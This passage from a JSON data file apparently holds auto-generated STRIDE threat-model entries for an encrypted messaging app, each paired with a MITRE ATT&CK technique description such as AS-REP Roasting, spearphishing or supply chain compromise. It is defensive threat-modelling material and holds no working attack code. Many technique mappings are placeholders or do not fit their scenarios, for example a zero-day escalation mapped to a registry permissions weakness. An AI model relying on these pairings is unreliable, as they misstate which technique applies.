                "description": "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking](https://attack.mitre.org/techniques/T1110/002) Kerberos messages.(Citation: Harmj0y Roasting AS-REPs Jan 2017) \n\nPreauthentication offers protection against offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002). When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user\u2019s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user\u2019s password.(Citation: Microsoft Kerberos Preauth 2014)\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking](https://attack.mitre.org/techniques/T1110/002) attacks similarly to [Kerberoasting](https://attack.mitre.org/techniques/T1558/003) and expose plaintext credentials. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019) \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell](https://attack.mitre.org/techniques/T1059/001) with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. (Citation: Harmj0y Roasting AS-REPs Jan 2017)(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
                "id": "attack-pattern--3986e7fd-a8e9-4ecb-bfc6-55920855912b",
                "technique_id": "T1558.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Using compromised companion devices to gain higher privileges on primary devices.",
            "Assumptions": [
                {
                    "Assumption": "The trust model allows elevated access between devices.",
                    "Role": "System",
                    "Condition": "Valid if inter-device trust is high."
                },
                {
                    "Assumption": "Companion devices have weaker security controls.",
                    "Role": "System",
                    "Condition": "Valid if device security varies."
                },
                {
                    "Assumption": "The attacker can exploit this trust relationship effectively.",
                    "Role": "Attacker",
                    "Condition": "Valid if trust exploitation is possible."
                }
            ],
            "Potential Impact": "Privilege escalation affecting primary devices.",
            "MITRE ATT&CK Keywords": [
                "trust exploitation",
                "cross-device access",
                "privilege transfer"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting vulnerabilities in encryption protocol implementation to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "There are implementation flaws in the encryption protocol.",
                    "Role": "System",
                    "Condition": "Valid if protocol implementation is flawed."
                },
                {
                    "Assumption": "The attacker has the capability to identify and exploit these flaws.",
                    "Role": "Attacker",
                    "Condition": "Valid if exploit is technically feasible."
                },
                {
                    "Assumption": "The system does not patch or update cryptographic libraries regularly.",
                    "Role": "System",
                    "Condition": "Valid if patch management is poor."
                }
            ],
            "Potential Impact": "Elevated access potentially leading to unauthorized control.",
            "MITRE ATT&CK Keywords": [
                "crypto vulnerability",
                "protocol exploitation",
                "elevated privileges"
            ],
            "mitre_technique": {
                "name": "Process Injection",
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
                "technique_id": "T1055"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "17",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake mobile application resembling a legitimate messaging app to steal users' credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users can be tricked into downloading and installing the fake app.",
                    "Role": "User",
                    "Condition": "When users rely solely on app appearance and not on verification from trusted sources."
                },
                {
                    "Assumption": "The attacker can host the fake app on a platform that users trust.",
                    "Role": "Attacker",
                    "Condition": "If the platform hosting the app does not perform adequate security checks."
                },
                {
                    "Assumption": "Victim's device security settings allow installation of third-party applications.",
                    "Role": "User",
                    "Condition": "When device security policies are not stringent."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user data.",
            "MITRE ATT&CK Keywords": [
                "Credential Harvesting",
                "Application Spoofing",
                "Phishing"
            ],
            "mitre_technique": {
                "name": "Malicious File",
                "description": "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).",
                "id": "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e",
                "technique_id": "T1204.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts the connection between the primary device and companion devices, impersonating the primary device.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can monitor or manipulate network traffic.",
                    "Role": "Attacker",
                    "Condition": "When network communication is not encrypted or secured."
                },
                {
                    "Assumption": "The companion device trusts the primary device without additional authentication checks.",
                    "Role": "Companion Device",
                    "Condition": "If the primary and companion devices use simple trust establishment techniques."
                },
                {
                    "Assumption": "The companion device does not notify the user when new connections are established.",
                    "Role": "User",
                    "Condition": "If the application does not provide proper alerts or logs for user awareness."
                }
            ],
            "Potential Impact": "Unauthorized access to messages and user data.",
            "MITRE ATT&CK Keywords": [
                "Session Hijacking",
                "Man-in-the-Middle",
                "Network Spoofing"
            ],
            "mitre_technique": {
                "name": "Remote Service Session Hijacking",
                "description": "Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.\n\nAdversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it hijacks an existing session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack)",
                "id": "attack-pattern--5b0ad6f8-6a16-4966-a4ef-d09ea6e2a9f5",
                "technique_id": "T1563"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a doppelganger website to mimic the official messaging application site to capture user credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users are likely to follow links without verifying the URL.",
                    "Role": "User",
                    "Condition": "If users are not vigilant about checking the domain of the website."
                },
                {
                    "Assumption": "The attacker can create a website that looks identical to the legitimate site.",
                    "Role": "Attacker",
                    "Condition": "When attackers have access to tools and techniques for cloning websites."
                },
                {
                    "Assumption": "The legitimate site does not use strong domain validation or anti-phishing tactics.",
                    "Role": "Service Provider",
                    "Condition": "If the service provider does not implement advanced security measures on the site."
                }
            ],
            "Potential Impact": "Credential theft leading to unauthorized account access.",
            "MITRE ATT&CK Keywords": [
                "Phishing",
                "Doppelganger Domain",
                "Credential Harvesting"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.(Citation: NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. (Citation: Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)) in addition to their username and password. This may enable the adversary to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation: Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page.(Citation: QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans.(Citation: qr-phish-agriculture) These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)), which may be less secure in several relevant ways.(Citation: qr-phish-agriculture) For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.",
                "id": "attack-pattern--2d3f5b3c-54ca-4f4d-bb1f-849346d31230",
                "technique_id": "T1598.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to a user's mobile device and installs a malicious application that alters the encrypted database.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the mobile device.",
                    "Role": "Attacker",
                    "Condition": "When device physical security is compromised."
                },
                {
                    "Assumption": "The device is not protected by strong authentication methods.",
                    "Role": "User",
                    "Condition": "If biometric or multi-factor authentication is not enabled."
                },
                {
                    "Assumption": "The application does not use tamper-evident logging or integrity checks for the database.",
                    "Role": "Application Developer",
                    "Condition": "If the application lacks robust integrity verification mechanisms."
                }
            ],
            "Potential Impact": "Corruption of stored messages and authentication pre-keys.",
            "MITRE ATT&CK Keywords": [
                "Database Tampering",
                "Malware Installation",
                "Physical Access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits a vulnerability in the encryption protocol implementation to modify encrypted messages.",
            "Assumptions": [
                {
                    "Assumption": "The encryption protocol has implementation vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "When cryptographic implementations are not thoroughly tested."
                },
                {
                    "Assumption": "The attacker can intercept and modify communications.",
                    "Role": "Attacker",
                    "Condition": "If network traffic is not end-to-end encrypted."
                },
                {
                    "Assumption": "The user applications do not validate message integrity properly.",
                    "Role": "Application Developer",
                    "Condition": "If message integrity checks (e.g., HMAC) are missing or weak."
                }
            ],
            "Potential Impact": "Unauthorized message alteration, leading to misinformation.",
            "MITRE ATT&CK Keywords": [
                "Protocol Exploitation",
                "Message Tampering",
                "Cryptographic Failure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker distributes a malicious update to the desktop client that modifies the application's behavior.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can spoof the update server or compromise the update distribution process.",
                    "Role": "Attacker",
                    "Condition": "When update mechanisms are not securely implemented."
                },
                {
                    "Assumption": "The application does not verify the integrity and authenticity of updates.",
                    "Role": "Application Developer",
                    "Condition": "If updates lack cryptographic signing and verification."
                },
                {
                    "Assumption": "Users automatically trust and install updates without verification.",
                    "Role": "User",
                    "Condition": "When the application does not alert users to verify the source of the update."
                }
            ],
            "Potential Impact": "Malicious code execution and data compromise.",
            "MITRE ATT&CK Keywords": [
                "Supply Chain Compromise",
                "Malware Distribution",
                "Software Update Compromise"
            ],
            "mitre_technique": {
                "name": "Supply Chain Compromise",
                "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (multiple cases of removable media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider Electric USB Malware) \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil 2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Symantec Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011) Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)",
                "id": "attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7",
                "technique_id": "T1195"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a toxic message, claiming it was forged.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks non-repudiation mechanisms.",
                    "Role": "Application Developer",
                    "Condition": "If cryptographic signing of messages is not enforced."
                },
                {
                    "Assumption": "The user can potentially repudiate transactions without proof.",
                    "Role": "User",
                    "Condition": "When message logs do not include tamper-proof evidence."
                },
                {
                    "Assumption": "The messaging platform does not keep secure, verifiable logs of all communications.",
                    "Role": "Service Provider",
                    "Condition": "When the platform's logging mechanism is weak or absent."
                }
            ],
            "Potential Impact": "Disputes over message authenticity and integrity.",
            "MITRE ATT&CK Keywords": [
                "Non-repudiation",
                "Message Forgery",
                "Transaction Repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user claims that they never received important messages, denying the receipt.",
            "Assumptions": [
                {
                    "Assumption": "The application does not have delivery receipt and read receipt mechanisms.",
                    "Role": "Application Developer",
                    "Condition": "If the application does not incorporate receipt acknowledgment features."
                },
                {
                    "Assumption": "The user knows how to exploit the absence of message receipt validation.",
                    "Role": "User",
                    "Condition": "When users understand the application's receipt validation limitations."
                },
                {
                    "Assumption": "The system lacks secure logging for message statuses.",
                    "Role": "Service Provider",
                    "Condition": "If the platform does not implement secure and verifiable message logs."
                }
            ],
            "Potential Impact": "Loss of trust in the messaging service and disputes over message delivery.",
            "MITRE ATT&CK Keywords": [
                "Receipt Forgery",
                "Message Repudiation",
                "Communication Denial"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker deletes log files on a compromised device to cover up malicious actions.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the log files on the device.",
                    "Role": "Attacker",
                    "Condition": "When device security is breached or compromised."
                },
                {
                    "Assumption": "The application stores logs locally without secure backup.",
                    "Role": "Application Developer",
                    "Condition": "If logging mechanisms do not include secure centralized storage."
                },
                {
                    "Assumption": "Log files are not protected against unauthorized modifications or deletions.",
                    "Role": "Service Provider",
                    "Condition": "When file access control mechanisms are weak or absent."
                }
            ],
            "Potential Impact": "Loss of forensic evidence and audit trails.",
            "MITRE ATT&CK Keywords": [
                "Log Deletion",
                "Cover-up Actions",
                "Forensics Evasion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--11000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the SQLite database to access unencrypted messages.",
            "Assumptions": [
                {
                    "Assumption": "The database encryption is weak or improperly implemented.",
                    "Role": "Application Developer",
                    "Condition": "When encryption algorithms are outdated or poorly applied."
                },
                {
                    "Assumption": "The attacker can execute code that interacts with the SQLite database.",
                    "Role": "Attacker",
                    "Condition": "If the device runs vulnerable software allowing code execution."
                },
                {
                    "Assumption": "The access control to database files is weak.",
                    "Role": "Service Provider",
                    "Condition": "When file permissions do not enforce strict access control."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive message content.",
            "MITRE ATT&CK Keywords": [
                "Database Exploitation",
                "Information Disclosure",
                "Message Decryption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker installs spyware on a compromised companion device, gaining access to messages.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can install malware on the companion device.",
                    "Role": "Attacker",
                    "Condition": "When device security is weak or physical access is obtained."
                },
                {
                    "Assumption": "The application does not detect or prevent the execution of unauthorized software.",
                    "Role": "Application Developer",
                    "Condition": "If anti-malware mechanisms are absent or bypassed."
                },
                {
                    "Assumption": "Users do not notice abnormal activity on the companion device.",
                    "Role": "User",
                    "Condition": "If user awareness or monitoring of device activities is low."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive user communications.",
            "MITRE ATT&CK Keywords": [
                "Spyware Installation",
                "Data Exfiltration",
                "Device Compromise"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A vulnerability allows attackers to bypass encryption and access message content during transmission.",
            "Assumptions": [
                {
                    "Assumption": "The encryption protocol has unpatched vulnerabilities.",
                    "Role": "Application Developer",
                    "Condition": "When protocols are not regularly updated and validated."
                },
                {
                    "Assumption": "The attacker can intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "If network communications are insecure or compromised."
                },
                {
                    "Assumption": "The application does not verify message integrity before decryption.",
                    "Role": "Service Provider",
                    "Condition": "If integrity checks (e.g., HMAC) are missing or improperly implemented."
                }
            ],
            "Potential Impact": "Unauthorized access to messages leading to data exposure.",
            "MITRE ATT&CK Keywords": [
                "Protocol Exploitation",
                "Network Interception",
                "Encryption Bypass"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the service with fake accounts, overwhelming the authentication system.",
            "Assumptions": [
                {
                    "Assumption": "The application does not limit the number of account creation attempts.",
                    "Role": "Application Developer",
                    "Condition": "If rate-limiting and CAPTCHA mechanisms are not implemented."
                },
                {
                    "Assumption": "The attacker can create a large number of requests quickly.",
                    "Role": "Attacker",
                    "Condition": "If automated tools are used to generate requests."
                },
                {
                    "Assumption": "The authentication system cannot distinguish between legitimate and fake requests.",
                    "Role": "Service Provider",
                    "Condition": "When anomaly detection mechanisms are absent or weak."
                }
            ],
            "Potential Impact": "Service unavailability due to system overload.",
            "MITRE ATT&CK Keywords": [
                "Brute Force",
                "Account Creation",
                "Authentication Flood"
            ],
            "mitre_technique": {
                "name": "Brute Force",
                "description": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.(Citation: TrendMicro Pawn Storm Dec 2020) Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism.(Citation: Dragos Crashoverride 2018) Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.",
                "id": "attack-pattern--a93494bb-4b80-4ea1-8695-3236a49916fd",
                "technique_id": "T1110"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A distributed denial of service (DDoS) attack targets the messaging service infrastructure.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can control a large botnet to generate traffic.",
                    "Role": "Attacker",
                    "Condition": "If sufficient resources for a DDoS attack are available."
                },
                {
                    "Assumption": "The application servers do not have robust DDoS protection.",
                    "Role": "Service Provider",
                    "Condition": "If mitigation mechanisms like load balancing are not in place."
                },
                {
                    "Assumption": "Network infrastructure cannot handle excessive traffic efficiently.",
                    "Role": "Infrastructure Provider",
                    "Condition": "When the server and network capacity are not scalable."
                }
            ],
            "Potential Impact": "Disruption of service, making messaging unavailable.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "Service Disruption",
                "Botnet Attack"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the database backend causing it to crash or become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "The database lacks adequate protection against high-volume queries.",
                    "Role": "Application Developer",
                    "Condition": "If rate-limiters and fail-safes are not implemented."
                },
                {
                    "Assumption": "The attacker can send crafted queries that degrade performance.",
                    "Role": "Attacker",
                    "Condition": "When queries are not validated or sanitized properly."
                },
                {
                    "Assumption": "Monitoring tools do not detect abnormal query patterns quickly.",
                    "Role": "Service Provider",
                    "Condition": "If anomaly detection systems are not effective."
                }
            ],
            "Potential Impact": "Database unavailability leading to service downtime.",
            "MITRE ATT&CK Keywords": [
                "Database Flooding",
                "Backend Crash",
                "Query Overload"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a zero-day vulnerability in the messaging app to gain higher privileges on the device.",
            "Assumptions": [
                {
                    "Assumption": "The application has unpatched vulnerabilities.",
                    "Role": "Application Developer",
                    "Condition": "When vulnerabilities are not quickly identified and fixed."
                },
                {
                    "Assumption": "The attacker can execute code on the target device.",
                    "Role": "Attacker",
                    "Condition": "If exploit payloads can be delivered and executed."
                },
                {
                    "Assumption": "The application does not enforce strict privilege separation.",
                    "Role": "Service Provider",
                    "Condition": "If the app operates with elevated privileges unnecessarily."
                }
            ],
            "Potential Impact": "Compromise of the entire device leading to full data access.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Zero-day Exploit",
                "Code Execution"
            ],
            "mitre_technique": {
                "name": "Service Registry Permissions Weakness",
                "description": "Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)",
                "id": "attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427",
                "technique_id": "T1058"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering to trick a user into executing a script that gains higher permissions on the companion device.",
            "Assumptions": [
                {
                    "Assumption": "The user can be tricked into running the malicious script.",
                    "Role": "User",
                    "Condition": "When the user lacks security awareness or training."
                },
                {
                    "Assumption": "The application does not prompt for additional authentication for sensitive actions.",
                    "Role": "Application Developer",
                    "Condition": "If critical actions do not require re-authentication."
                },
                {
                    "Assumption": "The script can exploit application or system vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "If the system or app has exploitable weaknesses."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and system resources.",
            "MITRE ATT&CK Keywords": [
                "Social Engineering",
                "Script Execution",
                "Runtime Privilege Escalation"
            ],
            "mitre_technique": {
                "name": "User Execution",
